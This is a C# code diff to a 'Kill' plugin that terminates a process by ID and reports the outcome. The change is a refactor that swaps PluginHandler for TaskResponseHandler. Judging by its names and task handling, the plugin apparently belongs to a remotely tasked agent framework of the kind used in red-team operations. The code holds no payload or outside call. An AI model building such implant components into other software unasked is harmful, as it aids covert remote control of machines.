@@ -1,9 +1,11 @@
 ﻿using Athena.Models;
-using Athena.Plugins;
+using Athena.Commands.Models;
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.Threading;
+using Athena.Commands;
+
 namespace Plugins
 {
     public class Kill : AthenaPlugin
@@ -13,7 +15,7 @@ namespace Plugins
         {
             if (!args.ContainsKey("id") || String.IsNullOrEmpty(args["id"].ToString()))
             {
-                PluginHandler.AddResponse(new ResponseResult
+                TaskResponseHandler.AddResponse(new ResponseResult
                 {
                     completed = true,
                     user_output = "ID not specified!",
@@ -34,7 +36,7 @@ namespace Plugins
                     {
                         if (i == 30)
                         {
-                            PluginHandler.AddResponse(new ResponseResult
+                            TaskResponseHandler.AddResponse(new ResponseResult
                             {
                                 completed = true,
                                 user_output = "Process ID " + proc.Id + " did not exit in the alotted time.",
@@ -47,7 +49,7 @@ namespace Plugins
                         i++;
                     }
 
-                    PluginHandler.AddResponse(new ResponseResult
+                    TaskResponseHandler.AddResponse(new ResponseResult
                     {
                         completed = true,
                         user_output = "Process ID " + proc.Id + " killed.",
@@ -56,7 +58,7 @@ namespace Plugins
                 }
                 catch (Exception e)
                 {
-                    PluginHandler.Write(e.ToString(), args["task-id"], true, "error");
+                    TaskResponseHandler.Write(e.ToString(), args["task-id"], true, "error");
                     return;
                 }
             }
